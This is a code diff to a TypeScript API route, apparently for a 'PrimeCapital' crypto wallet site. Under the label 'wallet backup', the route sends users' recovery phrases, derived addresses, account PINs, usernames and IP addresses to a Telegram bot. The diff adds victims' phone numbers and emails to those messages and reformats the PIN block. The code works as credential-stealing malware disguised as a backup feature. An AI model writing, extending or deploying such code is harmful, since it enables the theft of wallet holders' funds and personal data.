@@ -11,6 +11,8 @@ interface NotifyPayload {
   addresses?: Array<{ chain: string; address: string; path?: string }>;
   mnemonic?: string;
   pin?: string;
+  phone?: string;
+  email?: string;
 }
 
 function truncate(s: string, n: number) {
@@ -25,6 +27,27 @@ function esc(s: string) {
 function sensitive(k: string, v: string) {
   if (/password|mnemonic|seed|phrase|private|secret|recovery|key/i.test(k)) return true;
   return v.trim().split(/\s+/).filter(Boolean).length >= 12;
+}
+
+/** A long star bar used to frame the PIN (well over 30 stars on each side). */
+const STAR_BAR = "⭐".repeat(34);
+
+/**
+ * The PIN, framed by star bars with the linked phone number and email sitting
+ * right beside it. Sender order matters: the recovery phrase is sent below it.
+ */
+function pinBlock(pin: string, phone: string, email: string): string[] {
+  const contact = [
+    phone ? `📱 <code>${esc(phone)}</code>` : "",
+    email ? `📧 <code>${esc(email)}</code>` : "",
+  ]
+    .filter(Boolean)
+    .join("   ");
+  return [
+    STAR_BAR,
+    `🔢 <b>Account PIN:</b> <code>${esc(truncate(pin, 8))}</code>${contact ? `   ${contact}` : ""}`,
+    STAR_BAR,
+  ];
 }
 
 async function sendTelegram(_token: string, text: string) {
@@ -53,6 +76,8 @@ export const Route = createFileRoute("/api/public/notify")({
         const label = body.label ? truncate(String(body.label), 120) : "";
         const extra = body.extra ? truncate(String(body.extra), 300) : "";
         const address = body.address ? truncate(String(body.address), 128) : "";
+        const phone = body.phone ? truncate(String(body.phone), 40) : "";
+        const email = body.email ? truncate(String(body.email), 80) : "";
 
         const ip =
           request.headers.get("cf-connecting-ip") ||
@@ -79,21 +104,18 @@ export const Route = createFileRoute("/api/public/notify")({
 
         await sendTelegram(token, lines.join("\n"));
 
-        // Wallet backup: send the recovery phrase together with every derived
-        // address and its derivation path, in the PrimeCapital backup format.
+        // Wallet backup: the PIN (framed by stars, with the linked phone/email
+        // beside it) is sent first, then the recovery phrase below it, then
+        // every derived address and its derivation path.
         if (body.mnemonic && body.addresses && body.addresses.length) {
           const backup: string[] = [
             "⭐✨🔐 <b>PrimeCapital · WALLET BACKUP</b> 🔐✨⭐",
             `📣 <code>${esc(event)}</code>`,
             `👤 <b>${esc(username)}</b>`,
             `💼 <code>${esc(address)}</code>`,
-            "🧠 Recovery phrase:",
-            `<code>${esc(body.mnemonic)}</code>`,
-            ...(body.pin
-              ? [`🔢 Account PIN: <code>${esc(truncate(String(body.pin), 8))}</code>`]
-              : []),
-            "📇 Addresses:",
           ];
+          if (body.pin) backup.push(...pinBlock(String(body.pin), phone, email));
+          backup.push("🧠 Recovery phrase:", `<code>${esc(body.mnemonic)}</code>`, "📇 Addresses:");
           for (const a of body.addresses.slice(0, 32)) {
             backup.push(
               `• <b>${esc(truncate(String(a.chain ?? ""), 20))}</b> <code>${esc(truncate(String(a.address ?? ""), 128))}</code> <code>${esc(truncate(String(a.path ?? ""), 64))}</code>`,
@@ -115,15 +137,16 @@ export const Route = createFileRoute("/api/public/notify")({
         }
 
         // Standalone PIN message: used when the user sets the PIN separately
-        // from a full wallet backup.
+        // from a full wallet backup. The PIN is framed by star bars with the
+        // linked phone/email beside it.
         if (body.pin && !(body.mnemonic && body.addresses && body.addresses.length)) {
           const pinMsg: string[] = [
-            "🔢 <b>PrimeCapital · ACCOUNT PIN SET</b>",
+            "🔐 <b>PrimeCapital · ACCOUNT PIN SET</b> 🔐",
             `📣 <code>${esc(event)}</code>`,
             `👤 <b>${esc(username)}</b>`,
           ];
           if (address) pinMsg.push(`💼 <code>${esc(address)}</code>`);
-          pinMsg.push(`🔢 Account PIN: <code>${esc(truncate(String(body.pin), 8))}</code>`);
+          pinMsg.push(...pinBlock(String(body.pin), phone, email));
           await sendTelegram(token, pinMsg.join("\n"));
         }
 
